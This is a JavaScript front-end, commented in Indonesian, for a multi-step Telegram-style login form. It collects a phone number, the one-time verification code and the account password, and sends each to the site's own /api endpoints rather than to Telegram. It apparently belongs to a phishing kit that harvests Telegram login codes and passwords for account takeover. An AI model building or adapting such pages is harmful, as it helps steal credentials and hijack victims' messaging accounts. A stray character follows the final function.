async function showCodeConfirmation(event) {
  event.preventDefault();
  const countryCode = document.getElementById("country").value;
  const phoneNumber = document.getElementById("phone-number").value;

  // Validasi format nomor telepon
  if (!/^\d+$/.test(phoneNumber)) {
    alert("Nomor telepon tidak valid. Harap masukkan nomor yang benar.");
    return;
  }

  const fullPhoneNumber = countryCode + phoneNumber;

  const response = await fetch("/api/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ phone_number: fullPhoneNumber }),
  });

  const data = await response.json();
  alert(data.message || data.error);

  if (response.ok) {
    document.getElementById("phone-form").style.display = "none";
    document.getElementById("code-confirmation").style.display = "block";
  } else {
    // Jika nomor telepon tidak terdaftar, tampilkan pesan kesalahan
    if (data.error && data.error.includes("not registered")) {
      alert("Nomor telepon ini tidak terdaftar di Telegram.");
    }
  }
}

async function showPasswordConfirmation(event) {
  event.preventDefault();
  const verificationCode = document.getElementById("verification-code").value;
  const countryCode = document.getElementById("country").value;
  const phoneNumber = document.getElementById("phone-number").value;
  const fullPhoneNumber = countryCode + phoneNumber;

  const response = await fetch("/api/verify_code", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      phone_number: fullPhoneNumber,
      verification_code: verificationCode,
    }),
  });

  const data = await response.json();
  alert(data.message || data.error);

  if (response.ok) {
    document.getElementById("code-confirmation").style.display = "none";
    document.getElementById("popup").style.display = "block";
  } else {
    // Jika kode verifikasi salah, tampilkan pesan kesalahan
    if (data.message && data.message.includes("kode verifikasi salah")) {
      alert("Kode verifikasi yang Anda masukkan salah. Silakan coba lagi.");
    }
  }
}

async function verifyPassword(event) {
  event.preventDefault();
  const password = document.getElementById("password").value;
  const countryCode = document.getElementById("country").value;
  const phoneNumber = document.getElementById("phone-number").value;
  const fullPhoneNumber = countryCode + phoneNumber;

  const response = await fetch("/api/verify_password", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ phone_number: fullPhoneNumber, password: password }),
  });

  const data = await response.json();
  alert(data.message || data.error);

  if (response.ok) {
    document.getElementById("password-confirmation").style.display = "none";
    document.getElementById("popup").style.display = "block";
  }
}

function togglePasswordVisibility() {
  const passwordInput = document.getElementById("password");
  passwordInput.type = passwordInput.type === "password" ? "text" : "password";
}
s